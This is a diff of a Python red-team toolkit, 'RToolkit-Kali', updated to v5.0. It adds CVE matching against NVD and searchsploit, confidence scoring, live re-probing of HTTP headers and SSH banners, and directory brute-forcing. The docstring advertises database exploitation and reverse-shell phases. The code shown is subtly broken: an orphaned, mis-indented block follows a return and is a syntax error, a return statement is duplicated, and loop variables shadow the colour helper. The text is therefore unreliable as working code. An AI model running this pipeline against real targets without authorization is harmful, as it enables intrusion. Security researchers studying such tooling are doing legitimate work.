@@ -1,7 +1,7 @@
 #!/usr/bin/env python3
 """
-RToolkit-Kali v4.0 — MASTER RED TEAM TOOL
-Improvements over v3.0:
+RToolkit-Kali v5.0 — OVERPOWERED RED TEAM TOOL
+Improvements over v4.0:
   - Streaming command output (SSH keepalive terjamin)
   - Config file support (~/.rtoolkit/config.json)
   - Concurrent phase execution (nmap + subdomain parallel)
@@ -10,6 +10,11 @@ Improvements over v3.0:
   - Auto tmux detection + SSH keepalive check
   - Better error handling (no more bare except:pass)
   - Resume capability (skip completed phases)
+  - v5.0: NVD API live CVE data with caching
+  - v5.0: Searchsploit integration (exploit availability check)
+  - v5.0: Confidence scoring (CONFIRMED/SUSPECTED/THEORETICAL)
+  - v5.0: Validation loop for CRITICAL findings
+  - v5.0: Attack Path Generator (chaining analysis)
 
 Pipeline:
   1. nmap port scan → service detection → CVE match
@@ -18,12 +23,27 @@ Pipeline:
   4. dirsearch/ffuf → directory enumeration
   5. paramspider/arjun/x8 → parameter discovery
   6. nuclei/nikto/wpscan/sqlmap → vulnerability scan
-  7. Database exploitation (PostgreSQL/MySQL/MSSQL)
-  8. Reverse shell + exploit commands + reporting
+  7. NVD API → live CVE matching + CVSS scoring
+  8. searchsploit → exploit availability check
+  9. Validation loop → confirm critical findings
+  10. Attack Path Generator → chained exploit paths
+  11. Database exploitation (PostgreSQL/MySQL/MSSQL)
+  12. Reverse shell + exploit commands + reporting
 """
 import os, sys, json, socket, ssl, subprocess, datetime, re, shutil, time, struct, concurrent.futures, threading
 from pathlib import Path
 from urllib.parse import urlparse, quote, urljoin
+# v5.0: Optional modules (graceful degradation)
+try:
+    from nvd_client import NvdCache, query_nvd, merge_nvd_results, version_to_cves_with_nvd
+    HAS_NVD = True
+except ImportError:
+    HAS_NVD = False
+try:
+    from exploit_client import check_exploit_available, batch_exploit_check
+    HAS_EXPLOIT_CLIENT = True
+except ImportError:
+    HAS_EXPLOIT_CLIENT = False
 
 # colorama — cross-platform ANSI color
 try:
@@ -44,6 +64,7 @@ except ImportError:
     pass
 
 RESULTS_DIR = Path("kali_results")
+NVD_GLOBAL_CACHE = None  # v5.0: set in main(), read in version_to_cves_v5
 CVE_DB = {}
 cve_path = Path(__file__).parent / "cve_data.json"
 if cve_path.exists():
@@ -56,6 +77,10 @@ REPORT = {"target":"","timestamp":"","ips":[],"ports":[],"services":[],"cves":[]
     "subdomains":[],"live_urls":[],"technologies":[],"directories":[],"parameters":[],
     "vulnerabilities":[],"exploit_commands":[],"phase_times":{},
     "dns_records":[],"http_headers":{},"wp_plugins":[],"wp_themes":[],"cascade":{},
+    "cve_sources":{"local_db":0,"nvd_api":0,"hardcoded":0},
+    "cve_confidence":{"confirmed":0,"suspected":0,"theoretical":0},
+    "exploit_available_count":0,"nvd_cache_fresh":False,"nvd_cache_date":"",
+    "attack_paths":[],"validation_results":{"total_checked":0,"confirmed":0,"downgraded":0},
     "summary":{"total":0,"critical":0,"high":0,"medium":0,"low":0,"info":0}}
 
 CONFIG = {}
@@ -91,12 +116,285 @@ if not config_path.exists():
             "nikto_timeout": 300,
             "sqlmap_timeout": 180,
             "skip_phases": [],
-            "nmap_full_scan": False
+            "nmap_full_scan": False,
+            # v5.0: NVD API settings
+            "nvd_api_key": "",
+            "nvd_cache_days": 1,
+            "nvd_max_results": 20,
+            "enable_nvd_live": True,
+            "enable_exploit_check": True,
+            "enable_validation": True,
+            "enable_attack_paths": True,
+            "confidence_threshold": "SUSPECTED",
+            "validate_critical_only": True,
         }
         config_path.parent.mkdir(parents=True, exist_ok=True)
         config_path.write_text(json.dumps(CONFIG, indent=2), encoding='utf-8')
     except OSError:
         pass
+
+# ====== V5.0: VERSION NORMALIZATION & SEMVER ======
+def normalize_version(raw_version):
+    """Normalize version string: '2.4.38 (Debian)' -> '2.4.38', '9.6p1' -> '9.6', '8.1.30-1ubuntu1' -> '8.1.30'"""
+    if not raw_version:
+        return ""
+    v = str(raw_version).strip()
+    # Remove parenthesized suffixes: "2.4.38 (Debian)" -> "2.4.38"
+    v = re.sub(r'\s*\([^)]*\)', '', v).strip()
+    # Remove distro suffixes: "8.1.30-1ubuntu1" -> "8.1.30"
+    # But preserve SSH-style p-suffix: "9.6p1" -> keep "9.6p1"
+    if not re.search(r'\d+p\d+', v):
+        v = re.sub(r'[.-][a-zA-Z]+\d+(?:\.\d+)*$', '', v).strip()
+        v = re.sub(r'[.-]\d+[a-zA-Z]+\d*$', '', v).strip()
+    # Remove trailing .0: "5.0" -> "5.0" (ok), but strip dangling dots
+    v = v.strip('. ')
+    return v
+
+def version_in_range(detected, affected_start, affected_end=None):
+    """Check if detected version falls within affected range. Supports semver-like comparisons."""
+    try:
+        from packaging.version import Version as _Ver, InvalidVersion
+        def _parse(v):
+            try:
+                return _Ver(v)
+            except InvalidVersion:
+                return _Ver(re.sub(r'[^0-9.]', '', v) or '0')
+        det = _parse(detected)
+        if affected_start and _parse(affected_start) > det:
+            return False
+        if affected_end and _parse(affected_end) <= det:
+            return False
+        return True
+    except ImportError:
+        # Fallback: simple tuple comparison
+        def _to_tuple(v):
+            parts = re.findall(r'\d+', v)
+            return tuple(int(p) for p in parts) if parts else (0,)
+        det_t = _to_tuple(detected)
+        if affected_start and _to_tuple(affected_start) > det_t:
+            return False
+        if affected_end and _to_tuple(affected_end) <= det_t:
+            return False
+        return True
+
+def assign_confidence(cve_entry):
+    """Assign confidence level based on source, version match, exploit availability, and validation status."""
+    source = cve_entry.get("source", "local_db")
+    version_match = cve_entry.get("version_match_type", "exact")
+    exploit = cve_entry.get("exploit_available", False)
+    validated = cve_entry.get("validated", False)
+
+    # THEORETICAL: hardcoded or fuzzy matches
+    if source == "hardcoded":
+        return "THEORETICAL"
+    if version_match == "fuzzy":
+        return "THEORETICAL"
+
+    # CONFIRMED: NVD exact match + validated, or NVD exact + exploit available
+    if source == "nvd_api":
+        if version_match == "exact":
+            if validated:
+                return "CONFIRMED"
+            if exploit:
+                return "CONFIRMED"
+            return "SUSPECTED"
+        if version_match == "range":
+            if exploit and validated:
+                return "CONFIRMED"
+            return "SUSPECTED"
+
+    # Local DB exact match
+    if source == "local_db":
+        if version_match == "exact":
+            if validated:
+                return "CONFIRMED"
+            if exploit:
+                return "SUSPECTED"
+            return "SUSPECTED"
+        return "THEORETICAL"
+
+    return "THEORETICAL"
+
+def version_to_cves_v5(service_name, version, cve_db=None):
+    """Enhanced CVE matching: local DB (exact + semver) + NVD API via global cache."""
+    matches = []
+    if not version:
+        return matches
+    db = cve_db if cve_db is not None else CVE_DB
+    db_key = service_name.lower().replace(' ', '').replace('-', '')
+    if db_key not in db:
+        return matches
+    norm_ver = normalize_version(version)
+    if not norm_ver:
+        return matches
+
+    # 1. Try exact match first (fast path, backward compatible)
+    if norm_ver in db[db_key]:
+        for vuln in db[db_key][norm_ver]:
+            matches.append({"cve": vuln, "source": "local_db", "version_match_type": "exact"})
+
+    # 2. Try semver range match against all versions in DB
+    existing_ids = {m["cve"] for m in matches}
+    for db_ver, vulns in db[db_key].items():
+        if db_ver == norm_ver:
+            continue
+        if version_in_range(norm_ver, db_ver, None):
+            for vuln in vulns:
+                if vuln not in existing_ids:
+                    matches.append({"cve": vuln, "source": "local_db", "version_match_type": "range"})
+                    existing_ids.add(vuln)
+
+    # 3. NVD API fallback via global cache
+    if HAS_NVD and cfg("enable_nvd_live", True) and NVD_GLOBAL_CACHE is not None:
+        nvd_cves = query_nvd(db_key, norm_ver, NVD_GLOBAL_CACHE,
+                             cfg("nvd_api_key", ""), cfg("nvd_cache_days", 1))
+        for nvd in nvd_cves:
+            cve_id = nvd.get("cve_id", "")
+            if cve_id and cve_id not in existing_ids:
+                matches.append({
+                    "cve": cve_id, "source": "nvd_api",
+                    "cvss_score": nvd.get("cvss_score"),
+                    "version_match_type": "nvd_range",
+                    "description": nvd.get("description", ""),
+                })
+                existing_ids.add(cve_id)
+
+    return matches
+                    matches.append({"cve": vuln, "source": "local_db", "version_match_type": "range"})
+
+    return matches
+
+CONFIDENCE_LEVELS = ["CONFIRMED", "SUSPECTED", "THEORETICAL"]
+
+# ====== VALIDATION LOOP (v5.0) ======
+def validate_critical_finding(cve_entry, target_domain):
+    """Re-probe the target to confirm a CRITICAL CVE. Returns enriched dict with validated flag."""
+    validated = dict(cve_entry)
+    software = validated.get("software", "").lower()
+    version = validated.get("version", "")
+    cve_id = validated.get("cve", "")
+    sw_type = validated.get("service", "").lower()
+
+    # Skip validation for THEORETICAL findings
+    if validated.get("confidence") == "THEORETICAL":
+        validated["validated"] = False
+        validated["validation_note"] = "THEORETICAL — requires version confirmation"
+        return validated
+
+    # Web server validation: re-fetch headers
+    if any(w in software for w in ["apache", "nginx", "iis", "php", "wordpress", "joomla", "drupal"]):
+        for url in [f"https://{target_domain}", f"http://{target_domain}"]:
+            try:
+                import requests
+                r = requests.get(url, timeout=5, verify=False,
+                               headers={"User-Agent": "Mozilla/5.0"})
+                server = r.headers.get("Server", "")
+                powered = r.headers.get("X-Powered-By", "")
+                body = r.text
+                body_low = body.lower()
+
+                if "apache" in software and server:
+                    m = re.search(r'Apache[ /](\d+\.\d+(?:\.\d+)?)', server, re.I)
+                    if m and normalize_version(m.group(1)) == normalize_version(version):
+                        validated["validated"] = True
+                        validated["validation_note"] = f"Confirmed: server header shows {m.group(1)}"
+                        break
+                elif "nginx" in software and server:
+                    m = re.search(r'nginx[ /]?(\d+\.\d+(?:\.\d+)?)', server, re.I)
+                    if m and normalize_version(m.group(1)) == normalize_version(version):
+                        validated["validated"] = True
+                        validated["validation_note"] = f"Confirmed: server header shows {m.group(1)}"
+                        break
+                elif "php" in software and powered:
+                    m = re.search(r'PHP[ /](\d+\.\d+(?:\.\d+)?)', powered, re.I)
+                    if m and normalize_version(m.group(1)) == normalize_version(version):
+                        validated["validated"] = True
+                        validated["validation_note"] = f"Confirmed: X-Powered-By shows {m.group(1)}"
+                        break
+                elif "wordpress" in software:
+                    m = re.search(r'<meta name="generator"[^>]*content="WordPress (\d+\.\d+(?:\.\d+)?)"', body, re.I)
+                    if m and normalize_version(m.group(1)) == normalize_version(version):
+                        validated["validated"] = True
+                        validated["validation_note"] = f"Confirmed: WordPress generator meta shows {m.group(1)}"
+                        break
+            except Exception:
+                continue
+
+    # SSH validation: re-probe banner
+    if "openssh" in software:
+        try:
+            s = socket.socket(); s.settimeout(4)
+            s.connect((target_domain, 22))
+            banner = s.recv(1024).decode('utf-8', errors='replace').strip()
+            s.close()
+            m = re.search(r'SSH-\d+\.\d+-([^\s]+)', banner)
+            if m and normalize_version(m.group(1)) == normalize_version(version):
+                validated["validated"] = True
+                validated["validation_note"] = f"Confirmed: SSH banner shows {m.group(1)}"
+        except Exception:
+            pass
+
+    # If not validated, mark with note
+    if not validated.get("validated"):
+        validated["validated"] = False
+        validated["validation_note"] = "Could not re-confirm version via live probe"
+        # Downgrade confidence for unvalidated critical findings
+        if validated.get("confidence") == "CONFIRMED":
+            validated["confidence"] = "SUSPECTED"
+
+    return validated
+
+
+def validate_all_critical(cve_entries, target_domain, max_workers=5, critical_only=True):
+    """Thread-pooled validation of critical findings. Returns enriched CVE list."""
+    if not cve_entries:
+        return []
+    to_validate = []
+    for cv in cve_entries:
+        if critical_only and cv.get("severity") not in ["CRITICAL", "HIGH"]:
+            continue
+        if cv.get("confidence") == "THEORETICAL":
+            continue
+        if cv.get("validated"):
+            continue  # skip already validated
+        to_validate.append(cv)
+
+    if not to_validate:
+        return cve_entries
+
+    print(f"  {c(f'[Validation] Re-checking {len(to_validate)} findings...',C)}")
+    validated_map = {}
+    with concurrent.futures.ThreadPoolExecutor(max_workers=max_workers) as ex:
+        futures = {ex.submit(validate_critical_finding, cv, target_domain): cv for cv in to_validate}
+        done_count = 0
+        for future in concurrent.futures.as_completed(futures):
+            done_count += 1
+            try:
+                result = future.result()
+                validated_map[result.get("cve", "")] = result
+            except Exception as e:
+                pass
+
+    # Merge validated results back
+    enriched = []
+    confirmed = 0
+    downgraded = 0
+    for cv in cve_entries:
+        cid = cv.get("cve", "")
+        if cid in validated_map:
+            enriched.append(validated_map[cid])
+            if validated_map[cid].get("validated"):
+                confirmed += 1
+            else:
+                downgraded += 1
+        else:
+            enriched.append(cv)
+
+    REPORT["validation_results"]["total_checked"] += len(to_validate)
+    REPORT["validation_results"]["confirmed"] += confirmed
+    REPORT["validation_results"]["downgraded"] += downgraded
+    print(f"    {c(f'Validation: {confirmed} confirmed, {downgraded} downgraded',G if confirmed > downgraded else Y)}")
+    return enriched
 
 def banner():
     os.system('cls' if os.name == 'nt' else 'clear')
@@ -108,7 +406,7 @@ def banner():
 ║{W}  ██╔══██╗   ██║   ██║   ██║██║   ██║██╔═██╗ ██║     ██║   ██║   {R} ║
 ║{W}  ██║  ██║   ██║   ╚██████╔╝╚██████╔╝██║  ██╗███████╗██║   ██║   {R} ║
 ║{W}  ╚═╝  ╚═╝   ╚═╝    ╚═════╝  ╚═════╝ ╚═╝  ╚═╝╚══════╝╚═╝   ╚═╝   {R} ║
-║{Y}  v4.0 — Concurrent Pipeline: nmap∥subfinder→httpx→discovery→vuln→exploit{R} ║
+║{Y}  v5.0 — Overpowered Pipeline: nmap+subfinder+nvd_api+searchsploit+attack_paths{R} ║
 ╚══════════════════════════════════════════════════════════════╝{N}""")
 
 # ====== TIMER DECORATOR ======
@@ -135,19 +433,29 @@ def run_cmd_stream(cmd, timeout=120, desc="", silent=False):
             cmd, shell=True, stdout=subprocess.PIPE, stderr=subprocess.STDOUT,
             text=True, bufsize=1
         )
-        deadline = time.time() + timeout
+        start_time = time.time()
+        deadline = start_time + timeout
+        last_tick = start_time
+        line_count = 0
         for line in iter(proc.stdout.readline, ''):
-            if time.time() > deadline:
+            now = time.time()
+            if now > deadline:
                 proc.kill()
                 if not silent:
                     print(f"    {c(f'[TIMEOUT after {timeout}s]',R)}")
                 return "\n".join(stdout_lines), "TIMEOUT", False
             if line:
                 stdout_lines.append(line.rstrip())
-                if not silent:
-                    print(f"    {line.rstrip()}")
+                line_count += 1
+                elapsed = int(now - start_time)
+                if line_count <= 10 or (elapsed % 10 == 0 and now - last_tick >= 8):
+                    if not silent:
+                        print(f"    [{elapsed}s] {line.rstrip()[:120]}")
+                    last_tick = now
         proc.wait()
         ok = proc.returncode == 0
+        if not silent and len(stdout_lines) > 10:
+            print(f"    {c(f'✓ Selesai — {len(stdout_lines)} baris output dalam {int(time.time()-start_time)} detik',DIM)}")
         return "\n".join(stdout_lines), "", ok
     except Exception as e:
         if not silent:
@@ -284,18 +592,24 @@ def print_table(headers, rows, title=None):
 
 # ====== CVE ENGINE ======
 def version_to_cves(service_name, version):
-    matches = []
-    if not version:
-        return matches
-    db_key = service_name.lower().replace(' ', '').replace('-', '')
-    if db_key not in CVE_DB:
-        return matches
-    for db_ver, vulns in CVE_DB[db_key].items():
-        if version == db_ver:
-            matches.extend(vulns)
-    return matches
+    """Legacy wrapper — convert to CVE IDs only for backward compatibility."""
+    results = version_to_cves_v5(service_name, version)
+    return [r["cve"] for r in results]
 
-def risk_level(cve_text):
+def risk_level(cve_text, cvss_score=None):
+    """Determine severity from CVE text or CVSS score. Higher precision with CVSS."""
+    # If CVSS score provided, use it directly
+    if cvss_score is not None:
+        try:
+            score = float(cvss_score)
+            if score >= 9.0: return "CRITICAL"
+            if score >= 7.0: return "HIGH"
+            if score >= 4.0: return "MEDIUM"
+            if score >= 0.1: return "LOW"
+            return "INFO"
+        except (ValueError, TypeError):
+            pass
+    # Fallback: keyword-based heuristic
     t = cve_text.lower()
     if any(w in t for w in ['rce','critical','remote code','buffer overrun','code injection','heap overflow']):
         return "CRITICAL"
@@ -305,12 +619,43 @@ def risk_level(cve_text):
         return "MEDIUM"
     return "LOW"
 
-def add_cve(port, svc, software, version, cve_text):
-    sev = risk_level(cve_text)
+def add_cve(port, svc, software, version, cve_text, confidence="SUSPECTED", source="local_db",
+            cvss_score=None, exploit_available=False, exploit_edb_id=None, exploit_path=None,
+            validated=False, version_match_type="exact"):
+    """Add CVE to report with full metadata. Overloaded for backward compatibility."""
+    sev = risk_level(cve_text, cvss_score)
+    conf = assign_confidence({
+        "source": source, "version_match_type": version_match_type,
+        "exploit_available": exploit_available, "validated": validated
+    })
+    # Override confidence if explicitly set and stricter
+    conf = confidence if confidence in ["CONFIRMED", "SUSPECTED", "THEORETICAL"] else conf
     if not any(cv['cve']==cve_text for cv in REPORT["cves"]):
-        REPORT["cves"].append({"port":port,"service":svc,"software":software,"version":version,"cve":cve_text,"severity":sev})
+        entry = {
+            "port":port,"service":svc,"software":software,"version":version,
+            "normalized_version":normalize_version(version) if version else "",
+            "cve":cve_text,"severity":sev,
+            "confidence":conf,"source":source,"cvss_score":cvss_score,
+            "exploit_available":exploit_available,"exploit_edb_id":exploit_edb_id,
+            "exploit_path":exploit_path,"validated":validated,
+            "version_match_type":version_match_type
+        }
+        REPORT["cves"].append(entry)
         REPORT["summary"][sev.lower()] = REPORT["summary"].get(sev.lower(), 0) + 1
         REPORT["summary"]["total"] += 1
+        REPORT["cve_sources"][source] = REPORT["cve_sources"].get(source, 0) + 1
+        REPORT["cve_confidence"][conf.lower()] = REPORT["cve_confidence"].get(conf.lower(), 0) + 1
+        if exploit_available:
+            REPORT["exploit_available_count"] += 1
+
+def add_cve_v5(port, svc, software, version, cve_result):
+    """Add CVE entry from version_to_cves_v5 result dict. Accepts: {cve, source, version_match_type, cvss_score?}"""
+    add_cve(
+        port=port, svc=svc, software=software, version=version,
+        cve_text=cve_result["cve"], source=cve_result.get("source","local_db"),
+        version_match_type=cve_result.get("version_match_type","exact"),
+        cvss_score=cve_result.get("cvss_score")
+    )
 
 # ====== PURE PYTHON SUBDOMAIN ENUM (from rtoolkit.py) ======
 SUBDOMAIN_WORDLIST = ["www","mail","admin","blog","api","dev","test","stage",
@@ -526,6 +871,7 @@ def detect_tech_version(url):
 
 # ====== ENHANCED CVE MATCHING WITH WP PLUGINS (from rtoolkit.py) ======
 def match_cves_enhanced(techs):
+    """Enhanced CVE matching with semver range support. Plugin CVEs are THEORETICAL (no version verification)."""
     cves = []
     cve_map = {"Server":{"apache":"apache","nginx":"nginx","iis":"iis"},
         "PHP_version":"php","WordPress_version":"wordpress",
@@ -536,24 +882,28 @@ def match_cves_enhanced(techs):
         version = str(techs.get(version_field,"")) if isinstance(version_field,str) else None
         if version:
             db_key = version_field
-            if db_key in CVE_DB:
-                for ver, vulns in CVE_DB[db_key].items():
-                    if ver == version:
-                        for vuln in vulns:
-                            sev = "CRITICAL" if any(w in vuln for w in ["RCE","Critical","remote"]) else "HIGH"
-                            cves.append({"software":db_key.title(),"version":version,"cve":vuln,"severity":sev})
+            # Use semver-aware lookup
+            results = version_to_cves_v5(db_key, version)
+            for res in results:
+                sev = "CRITICAL" if any(w in res["cve"] for w in ["RCE","Critical","remote","Priv"]) else "HIGH"
+                cves.append({"software":db_key.title(),"version":version,
+                    "cve":res["cve"],"severity":sev,"source":res["source"],
+                    "version_match_type":res["version_match_type"]})
     server = techs.get("Server","")
     for soft, db_key in [("Apache","apache"),("nginx","nginx"),("IIS","iis")]:
         if soft.lower() in server.lower():
             m = re.search(rf'{re.escape(soft)}[ /](\d+\.\d+(?:\.\d+)?)', server)
-            if m and db_key in CVE_DB:
+            if m:
                 ver = m.group(1)
-                for db_ver, vulns in CVE_DB[db_key].items():
-                    if ver == db_ver:
-                        for vuln in vulns:
-                            sev = "CRITICAL" if "RCE" in vuln else "HIGH"
-                            cves.append({"software":soft,"version":ver,"cve":vuln,"severity":sev})
+                results = version_to_cves_v5(db_key, ver)
+                for res in results:
+                    sev = "CRITICAL" if "RCE" in res["cve"] else "HIGH"
+                    cves.append({"software":soft,"version":ver,"cve":res["cve"],
+                        "severity":sev,"source":res["source"],
+                        "version_match_type":res["version_match_type"]})
     if "WP_Plugins" in techs:
+        # NOTE: These CVEs are THEORETICAL — no version verification possible
+        # In a future version, try to fetch /wp-content/plugins/{plugin}/readme.txt for version
         known_plugin_cves = {
             "contact-form-7":"CVE-2020-35489 (File Upload vulnerability)",
             "elementor":"CVE-2023-48777 (Stored XSS)",
@@ -582,7 +932,11 @@ def match_cves_enhanced(techs):
         for plugin in techs["WP_Plugins"]:
             for pname, pcve in known_plugin_cves.items():
                 if pname in plugin or plugin in pname:
-                    cves.append({"software":f"WP Plugin: {plugin}","version":"unknown","cve":pcve,"severity":"HIGH"})
+                    # ALL plugin CVEs are THEORETICAL — marked explicitly
+                    cves.append({"software":f"WP Plugin: {plugin}","version":"unknown",
+                        "cve":pcve,"severity":"HIGH","confidence":"THEORETICAL",
+                        "source":"hardcoded","version_match_type":"none",
+                        "_note":"[THEORETICAL - plugin version not verified; confirm plugin version before reporting]"})
     return cves
 
 # ====== DEEP DIRECTORY BRUTEFORCE (from rtoolkit.py) ======
@@ -675,12 +1029,21 @@ DIR_WORDLIST = [
     ".htaccess",".htpasswd",
 ]
 
+def progress_iter(items, desc="Processing"):
+    total = len(items)
+    for i, item in enumerate(items, 1):
+        if i % max(1, total//10) == 0 or i == 1 or i == total:
+            pct = int(i/total*100)
+            bar = '█'*(pct//5) + '░'*(20-pct//5)
+            print(f"    {c(f'[{bar}] {pct}%',DIM)} {desc} ({i}/{total})", end='\r' if i < total else '\n')
+        yield item
+
 def dir_bruteforce(url, depth=0, max_depth=2, results=None):
     if results is None:
         results = []
     if depth > max_depth or not HAS_REQUESTS:
         return results
-    for path in DIR_WORDLIST:
+    for path in progress_iter(DIR_WORDLIST, f"Depth {depth}"):
         full_url = f"{url.rstrip('/')}/{path.lstrip('/')}"
         try:
             r = requests.get(full_url, timeout=3, allow_redirects=False, verify=False,
@@ -872,6 +1235,32 @@ def print_tls_results(tls):
             print(f"  {c(f'[!] {w} supported — should be disabled',R)}")
             REPORT["vulnerabilities"].append({"name":f"Weak TLS: {w}","severity":"HIGH",
                 "url":f"{tls['host']}:{tls['port']}","source":"tls_check"})
+
+# ====== OUTPUT HELPERS ======
+def print_separator():
+    print(f"  {c('─'*55,DIM)}")
+
+def print_phase_done(phase_name, stats):
+    items = " | ".join(f"{k}: {c(str(v),W)}" for k,v in stats.items() if v)
+    print(f"\n  {c('✔',G)} {c(phase_name+' SELESAI',BOLD)} {c(items,DIM) if items else ''}")
+
+def print_critical_box(title, items):
+    if not items:
+        return
+    print(f"\n  {c('╔'+'═'*53+'╗',R)}")
+    print(f"  {c('║',R)} {c('🚨 '+title,R)}")
+    print(f"  {c('╠'+'═'*53+'╣',R)}")
+    for item in items[:5]:
+        print(f"  {c('║',R)} {c(str(item)[:75],W)}")
+    if len(items) > 5:
+        print(f"  {c('║',R)} ... +{len(items)-5} more")
+    print(f"  {c('╚'+'═'*53+'╝',R)}")
+
+def print_vuln_item(severity, name, url=""):
+    sev_color = SEV_COLORS.get(severity.upper(), W)
+    sev_label = severity.upper().ljust(10)
+    url_part = f" {c(url[:50],DIM)}" if url else ""
+    print(f"    {c(sev_label,sev_color)} {c(name[:60],W)} {url_part}")
 
 # ====== SOCKET PROBES ======
 PROBE_PORTS = [21,22,23,25,53,80,110,111,135,139,143,389,443,445,465,587,
@@ -1140,6 +1529,20 @@ def phase1_nmap(domain):
                 pt2 = [[str(p), ""] for p in extra]
                 print_table(["Port","Service"], pt2, "[PORTS LANJUTAN]")
 
+    # Phase 1a summary
+    if 'port_lines' in dir():
+        n_ports = len(port_lines) if port_lines else 0
+        h_up = hosts_up if hosts_up else 0
+        os_str = os_detected[0] if os_detected else 0
+    else:
+        n_ports = len(open_ports) if 'open_ports' in dir() and open_ports else 0
+        h_up = 0; os_str = 0
+    print_phase_done("Phase 1a — Nmap", {
+        "Port terbuka": n_ports,
+        "Host aktif": h_up,
+        "OS": os_str
+    })
+    return target_ip, tools
     return target_ip, tools
 
 @timer
@@ -1207,34 +1610,70 @@ def phase1_banner_grab(domain, target_ip, open_ports=None):
     else:
         print(f"  {c('ℹ️  Tidak ada service yang teridentifikasi',Y)}")
 
-    # CVE matching
+    # CVE matching (v5: semver-aware, source-tagged)
     cve_count = 0
     for s in services:
         for app, ver in s.get("techs", {}).items():
             if not ver:
                 continue
-            for cv in version_to_cves(app, ver):
-                add_cve(s["port"], s.get("protocol", ""), app, ver, cv)
+            for cv_res in version_to_cves_v5(app, ver):
+                add_cve_v5(s["port"], s.get("protocol", ""), app, ver, cv_res)
                 cve_count += 1
         if s.get("protocol") == "ssh" and s.get("version"):
-            for cv in version_to_cves("openssh", s["version"]):
-                add_cve(s["port"], "ssh", "OpenSSH", s["version"], cv)
+            for cv_res in version_to_cves_v5("openssh", s["version"]):
+                add_cve_v5(s["port"], "ssh", "OpenSSH", s["version"], cv_res)
                 cve_count += 1
 
+    # Print CVE table with confidence tags
     if REPORT["cves"]:
         print(f"\n  {c('⚠️  CVE DITEMUKAN:',R)} {len(REPORT['cves'])} kerentanan tercatat")
         print(f"  {c('  ⤷ CVE = kerentanan yang sudah dikenal publik. Prioritaskan yang CRITICAL!',DIM)}")
+        CONF_COLORS = {"CONFIRMED": G, "SUSPECTED": Y, "THEORETICAL": R}
         ct = [[str(cv["port"]), cv["service"], cv["software"], cv["version"],
                c(cv["cve"][:55], SEV_COLORS.get(cv["severity"], W)),
-               c(cv["severity"], SEV_COLORS.get(cv["severity"], W))]
+               c(cv["severity"], SEV_COLORS.get(cv["severity"], W)),
+               c(cv.get("confidence","?")[:10], CONF_COLORS.get(cv.get("confidence","?"), DIM))]
               for cv in REPORT["cves"]]
-        print_table(["Port","Svc","Software","Ver","CVE","Sev"], ct[:30],
+        print_table(["Port","Svc","Software","Ver","CVE","Sev","Conf"], ct[:30],
                    f"[DAFTAR CVE ({len(REPORT['cves'])} total)]")
         if len(ct) > 30:
             print(f"    ... dan {len(ct)-30} CVE lainnya (lihat report)")
-    else:
-        print(f"  {c('✅ Tidak ada CVE yang cocok dari banner service',G)}")
+        critical_cves = [cv for cv in REPORT["cves"] if cv["severity"] == "CRITICAL"]
+        if critical_cves:
+            print_critical_box("CRITICAL CVEs - Perbaiki segera!", [
+                f"{cv['cve'][:50]} - {cv['software']} {cv['version']}" for cv in critical_cves[:8]
+            ])
 
+        # v5.0: Enrich CVEs with exploit availability
+        if HAS_EXPLOIT_CLIENT and cfg("enable_exploit_check", True) and REPORT["cves"]:
+            print(f"  {c('[Exploit Check] Checking exploit availability via searchsploit...',C)}")
+            enriched = batch_exploit_check(REPORT["cves"])
+            REPORT["cves"] = enriched
+            exploit_count = sum(1 for c in enriched if c.get("exploit_available"))
+            if exploit_count:
+                print(f"  {c(f'  -> {exploit_count} exploit(s) available',R)}")
+                REPORT["exploit_available_count"] = exploit_count
+            else:
+                print(f"  {c('  -> No public exploits found (or searchsploit not installed)',Y)}")
+
+        # v5.0: Validate CRITICAL findings
+        if cfg("enable_validation", True) and REPORT["cves"]:
+            REPORT["cves"] = validate_all_critical(REPORT["cves"], domain, critical_only=cfg("validate_critical_only", True))
+            conf_counts = {"confirmed":0,"suspected":0,"theoretical":0}
+            for c in REPORT["cves"]:
+                cl = c.get("confidence","SUSPECTED").lower()
+                if cl in conf_counts: conf_counts[cl] += 1
+            REPORT["cve_confidence"] = conf_counts
+            vr = REPORT["validation_results"]
+            if vr["total_checked"] > 0:
+                print(f"  {c(f'Validation: {vr["confirmed"]} confirmed, {vr["downgraded"]} downgraded',G if vr["confirmed"] else Y)}")
+    else:
+        print(f"  {c('Tidak ada CVE yang cocok dari banner service',G)}")
+
+    print_phase_done("Phase 1b - Banner Grab", {
+        "Service": len(services),
+        "CVE": len(REPORT['cves'])
+    })
     return services
 
 @timer
@@ -1290,11 +1729,19 @@ def phase1_subdomains(domain, tools):
     all_subs = set(live_subs.keys()) | {domain}
     REPORT["subdomains"] = list(all_subs)
 
-    sub_table = [[s, live_subs.get(s, "")] for s in sorted(all_subs)[:30]]
-    print_table(["Subdomain","IP"], sub_table, f"[SUBDOAINS ({len(all_subs)} total)]")
-    if len(all_subs) > 30:
-        print(f"    ... +{len(all_subs)-30} more")
+    if len(all_subs) <= 1:
+        print(f"  {c('ℹ️  Tidak ada subdomain tambahan yang ditemukan (selain root domain)',Y)}")
+        print(f"  {c('  ⤷ Subdomain enumeration lemah — coba dengan wordlist lebih besar',DIM)}")
+    else:
+        sub_table = [[s, live_subs.get(s, "")] for s in sorted(all_subs)[:30]]
+        print_table(["Subdomain","IP"], sub_table, f"[SUBDOAINS ({len(all_subs)} total)]")
+        if len(all_subs) > 30:
+            print(f"    ... +{len(all_subs)-30} more")
 
+    print_phase_done("Phase 1c — Subdomain", {
+        "Subdomain": len(all_subs),
+        "Live": len(live_subs)
+    })
     return list(all_subs)
 
 @timer
@@ -1351,10 +1798,14 @@ def phase1_httpx(domain, all_subs, tools):
                 pass
 
     REPORT["live_urls"] = list(live_urls)
-    live_table = [[u[:80], "✓"] for u in sorted(live_urls)[:20]]
-    print_table(["URL","Status"], live_table, f"[LIVE HOSTS ({len(live_urls)} total)]")
-    if len(live_urls) > 20:
-        print(f"    ... +{len(live_urls)-20} more")
+    if len(live_urls) <= 2:
+        print(f"  {c('ℹ️  Tidak ada host live tambahan selain target utama',Y)}")
+        print(f"  {c('  ⤷ Mungkin subdomain tidak punya web server, atau diblokir firewall',DIM)}")
+    else:
+        live_table = [[u[:80], "✓"] for u in sorted(live_urls)[:20]]
+        print_table(["URL","Status"], live_table, f"[LIVE HOSTS ({len(live_urls)} total)]")
+        if len(live_urls) > 20:
+            print(f"    ... +{len(live_urls)-20} more")
 
     # WhatWeb
     if tools.get("whatweb") and live_urls:
@@ -1369,7 +1820,12 @@ def phase1_httpx(domain, all_subs, tools):
                     tech_entry = f"{tname}: {tver}"
                     if tech_entry not in REPORT["technologies"]:
                         REPORT["technologies"].append(tech_entry)
